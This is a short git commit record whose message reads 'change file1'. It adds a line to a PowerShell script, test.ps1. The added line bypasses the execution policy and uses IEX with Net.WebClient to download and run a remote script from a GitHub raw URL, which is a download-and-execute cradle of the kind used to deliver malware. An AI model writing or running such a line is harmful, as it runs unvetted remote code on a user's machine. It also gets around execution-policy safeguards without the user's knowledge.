bf1451214a91321daa4ff9684c6dc0162b7845c0
begiilm <2889380071@qq.com>
2016-02-26 19:47:10 +0800

    change file1

--- test.ps1
+++ test.ps1
@@ -1,1 +1,2 @@
 echo nihao > f:\testok1.txt
+powershell -ExecutionPolicy Bypass -NoLogo -NoProfile IEX (New-Object Net.WebClient).DownloadString('https://github.com/begiilm/dy/raw/master/test2.ps1')
